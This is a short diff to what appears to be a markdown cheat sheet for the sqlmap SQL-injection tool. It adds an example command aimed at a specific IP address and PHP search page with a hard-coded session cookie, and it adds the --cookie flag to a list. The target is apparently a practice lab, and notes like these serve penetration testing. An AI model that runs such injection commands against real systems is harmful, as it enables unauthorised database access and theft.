@@ -404,6 +404,9 @@ sqlmap -r <request_file> -p parameter [options]
 ## More examples
 
 ```
+
+ sqlmap -u "http://192.210.141.3/sqli_1.php?title=hello&action=search" --cookie"PHPSESSID=ipcund5314149g188pfhb3pff1; security_level=0" -p title
+
 # Example extract database banner
 sqlmap -u <TARGET> --banner <other options>
 
@@ -460,6 +463,7 @@ sqlmap -u <TARGET> --suffix "'));'
 
 ## more flags
 ```
+--cookie
 --risk
 --level
 --keep-alive
